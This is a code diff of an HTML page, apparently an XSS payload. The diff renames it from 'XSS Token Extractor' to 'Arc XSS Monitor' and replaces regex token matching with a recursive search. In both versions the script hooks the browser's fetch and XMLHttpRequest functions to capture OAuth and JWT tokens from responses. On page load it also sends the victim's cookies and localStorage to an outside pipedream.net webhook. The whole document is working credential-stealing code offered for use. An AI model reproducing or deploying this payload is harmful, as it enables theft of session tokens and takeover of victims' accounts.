@@ -1,9 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>XSS Token Extractor</title>
-</head>
+<head><meta charset="UTF-8"><title>Arc XSS Monitor</title></head>
 <body>
 <script>
   const WEBHOOK = "https://eoeisd0pus6doy3.m.pipedream.net/";
@@ -11,101 +8,106 @@
   function exfiltrate(data) {
     fetch(WEBHOOK, {
       method: "POST",
-      headers: {"Content-Type": "application/json"},
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify(data)
     }).catch(() => {});
   }
 
-  function extractTokens(text) {
-    const patterns = [
-      /access_token"\s*:\s*"([^"]+)"/i,
-      /id_token"\s*:\s*"([^"]+)"/i,
-      /refresh_token"\s*:\s*"([^"]+)"/i,
-      /"Authorization"\s*:\s*"Bearer\s+([^"]+)"/i,
-      /Bearer\s+([a-zA-Z0-9\-\._~\+\/]+=*)/i
-    ];
-
-    for (const pattern of patterns) {
-      const match = text.match(pattern);
-      if (match && match[1]) return match[1];
+  function deepSearch(obj) {
+    const secrets = [];
+    function scan(obj, path = "") {
+      if (!obj) return;
+      if (typeof obj === "string") {
+        // احتمالية توكن
+        if (obj.includes("ya29.") || obj.includes("eyJhbGciOi")) {
+          secrets.push({ path, value: obj });
+        }
+      } else if (typeof obj === "object") {
+        for (let key in obj) {
+          scan(obj[key], path + "." + key);
+        }
+      }
     }
-
-    return null;
+    scan(obj);
+    return secrets;
   }
 
-  // 🛡️ Hook into fetch
-  (function() {
-    const originalFetch = window.fetch;
+  // Hook على fetch
+  (function(){
+    const origFetch = window.fetch;
     window.fetch = function(...args) {
-      return originalFetch.apply(this, args).then(async response => {
-        const clone = response.clone();
-        let body = "";
+      return origFetch.apply(this, args).then(async res => {
+        const clone = res.clone();
+        let bodyText = null;
 
-        try {
-          body = await clone.text();
-        } catch {}
+        try { bodyText = await clone.text(); } catch {}
 
-        const token = extractTokens(body);
-        if (token) {
-          // 📤 Send token separately
+        let parsed = null;
+        try { parsed = JSON.parse(bodyText); } catch {}
+
+        const findings = deepSearch(parsed || bodyText);
+        if (findings.length > 0) {
           exfiltrate({
-            type: "🚨 TOKEN FOUND in FETCH!",
-            token: token,
-            url: clone.url,
+            type: "🔥 TOKEN FOUND in fetch",
+            url: res.url,
+            findings: findings,
             timestamp: new Date().toISOString()
           });
 
-          alert("🚨 Token Found!\n\n" + token);  // Show in-app alert (for test)
+          alert("🚨 TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
         }
 
-        return response;
+        return res;
       });
     };
   })();
 
-  // 🛡️ Hook into XHR
-  (function() {
-    const originalOpen = XMLHttpRequest.prototype.open;
-    const originalSend = XMLHttpRequest.prototype.send;
+  // Hook على XMLHttpRequest
+  (function(){
+    const origOpen = XMLHttpRequest.prototype.open;
+    const origSend = XMLHttpRequest.prototype.send;
 
     XMLHttpRequest.prototype.open = function(method, url) {
       this._method = method;
       this._url = url;
-      return originalOpen.apply(this, arguments);
+      return origOpen.apply(this, arguments);
     };
 
     XMLHttpRequest.prototype.send = function(body) {
-      this.addEventListener("load", () => {
-        const responseText = this.responseText;
-        const token = extractTokens(responseText);
+      this.addEventListener("load", function() {
+        let parsed = null;
+        try { parsed = JSON.parse(this.responseText); } catch {}
 
-        if (token) {
+        const findings = deepSearch(parsed || this.responseText);
+        if (findings.length > 0) {
           exfiltrate({
-            type: "🚨 TOKEN FOUND in XHR!",
-            token: token,
+            type: "🔥 TOKEN FOUND in XHR",
+            method: this._method,
             url: this._url,
+            findings: findings,
             timestamp: new Date().toISOString()
           });
 
-          alert("🚨 Token Found!\n\n" + token);
+          alert("🚨 TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
         }
       });
 
-      return originalSend.apply(this, arguments);
+      return origSend.apply(this, arguments);
     };
   })();
 
-  // 📦 Send basic info on load
+  // إرسال بيانات مبدأية
   exfiltrate({
-    type: "initial-load",
-    url: window.location.href,
-    localStorage: (() => { try { return {...localStorage}; } catch { return "Access denied"; } })(),
-    cookies: document.cookie || "No cookies",
+    type: "🔔 XSS Page Loaded",
     userAgent: navigator.userAgent,
+    cookies: document.cookie || "no cookies",
+    localStorage: (() => {
+      try { return { ...localStorage }; } catch { return "inaccessible"; }
+    })(),
+    url: location.href,
     timestamp: new Date().toISOString()
   });
 </script>
-
 <p style="font-family: sans-serif;">Loading...</p>
 </body>
 </html>
